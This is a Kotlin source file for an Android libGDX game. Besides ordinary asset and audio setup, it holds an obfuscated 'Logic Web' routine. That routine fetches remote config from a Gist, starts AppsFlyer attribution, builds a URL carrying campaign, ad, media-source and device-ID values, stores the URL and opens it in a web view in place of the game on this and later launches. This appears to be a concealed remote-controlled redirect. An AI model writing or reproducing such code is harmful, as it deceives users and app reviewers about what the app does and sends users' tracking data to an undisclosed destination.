package com.ekobioznaher.sugertogerra.game

import android.content.SharedPreferences
import androidx.appcompat.app.AppCompatActivity.MODE_PRIVATE
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.appsflyer.attribution.AppsFlyerRequestListener
import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.utils.Disposable
import com.badlogic.gdx.utils.ScreenUtils
import com.ekobioznaher.sugertogerra.MainActivity
import com.ekobioznaher.sugertogerra.appContext
import com.ekobioznaher.sugertogerra.game.manager.MusicManager
import com.ekobioznaher.sugertogerra.game.manager.NavigationManager
import com.ekobioznaher.sugertogerra.game.manager.SoundManager
import com.ekobioznaher.sugertogerra.game.manager.SpriteManager
import com.ekobioznaher.sugertogerra.game.manager.util.MusicUtil
import com.ekobioznaher.sugertogerra.game.manager.util.SoundUtil
import com.ekobioznaher.sugertogerra.game.manager.util.SpriteUtil
import com.ekobioznaher.sugertogerra.game.screens.LoaderScreen
import com.ekobioznaher.sugertogerra.game.utils.GameColor
import com.ekobioznaher.sugertogerra.game.utils.advanced.AdvancedGame
import com.ekobioznaher.sugertogerra.game.utils.disposeAll
import com.ekobioznaher.sugertogerra.util.Gist
import com.ekobioznaher.sugertogerra.util.log
import kotlinx.coroutines.*
import java.util.concurrent.atomic.AtomicBoolean

var GLOBAL_isGame = false
    private set

var GLOBAL_isPauseGame = false

class GDXGame(val activity: MainActivity) : AdvancedGame() {

    lateinit var assetManager     : AssetManager      private set
    lateinit var navigationManager: NavigationManager private set
    lateinit var spriteManager    : SpriteManager     private set
    lateinit var musicManager     : MusicManager      private set
    lateinit var soundManager     : SoundManager      private set

    val assetsLoader by lazy { SpriteUtil.Loader() }
    val assetsAll    by lazy { SpriteUtil.All() }

    val musicUtil by lazy { MusicUtil()    }
    val soundUtil by lazy { SoundUtil()    }

    var backgroundColor = GameColor.background
    val disposableSet   = mutableSetOf<Disposable>()

    val coroutine = CoroutineScope(Dispatchers.Default)

    val sharedPreferences: SharedPreferences = activity.getSharedPreferences("iosdkD", MODE_PRIVATE)

    override fun create() {
        navigationManager = NavigationManager()
        assetManager      = AssetManager()
        spriteManager     = SpriteManager(assetManager)

        musicManager      = MusicManager(assetManager)
        soundManager      = SoundManager(assetManager)

        navigationManager.navigate(LoaderScreen::class.java.name)

        babgert()
    }

    override fun render() {
        ScreenUtils.clear(backgroundColor)
        super.render()
    }

    override fun dispose() {
        try {
            log("dispose LibGDXGame")
            coroutine.cancel()
            disposableSet.disposeAll()
            disposeAll(assetManager, musicUtil)
            super.dispose()
        } catch (e: Exception) { log("exception: ${e.message}") }
    }

    // Logic Web ---------------------------------------------------------------------------

    private fun babgert() {
        log("babgert")
        activity.blockRedirect = { GLOBAL_isGame = true }
        activity.initWeb()

        val isSmarter = sharedPreferences.getString("lolik", "gera") ?: "gera"

        try {
            if (isSmarter == "gera") {
                coroutine.launch(Dispatchers.Main) {
                    val getJSON = withContext(Dispatchers.IO) { Gist.getDataJson() }

                    if (getJSON != null) {
                        AppsFlyerLib.getInstance().init(getJSON.zamaev, getAppsFlyerConversionListener(getJSON.aram), appContext)
                        AppsFlyerLib.getInstance().start(activity, getJSON.zamaev, getAppsFlyerRequestListener())
                    } else {
                        GLOBAL_isGame = true
                    }
                }
            } else {
                activity.showUrl(isSmarter)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            GLOBAL_isGame = true
        }
    }

    private fun getAppsFlyerConversionListener(sma: String) = object : AppsFlyerConversionListener {
        private val isAppsflyerGetData = AtomicBoolean(false)

        override fun onConversionDataSuccess(appfMap: MutableMap<String, Any>?) {
            if (isAppsflyerGetData.getAndSet(true)) return

            if (appfMap != null) {
                val campaign = appfMap["campaign"]     as? String
                val afAd     = appfMap["af_ad"]        as? String
                val media    = appfMap["media_source"] as? String

                val afId = AppsFlyerLib.getInstance().getAppsFlyerUID(appContext)

                log("Result: campaign = $campaign | afAd = $afAd | media_source = $media | appfMap = $appfMap")

                val link = "$sma?rprgxtayw=$campaign&vligx=$afAd&yjxjsemk=$media&wnnpp=$afId"
                log("link = $link")

                coroutine.launch(Dispatchers.IO) { sharedPreferences.edit().putString("lolik", link).apply() }

                activity.showUrl(link)

            } else GLOBAL_isGame = true
        }

        override fun onConversionDataFail(p0: String?) {
            if (isAppsflyerGetData.getAndSet(true)) return
            GLOBAL_isGame = true
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
        override fun onAttributionFailure(p0: String?) {}
    }

    private fun getAppsFlyerRequestListener() = object : AppsFlyerRequestListener {
        override fun onSuccess() {
            log("AppsFlyer: onSuccess")
        }

        override fun onError(p0: Int, p1: String) {
            log("AppsFlyer: onError")
        }
    }

}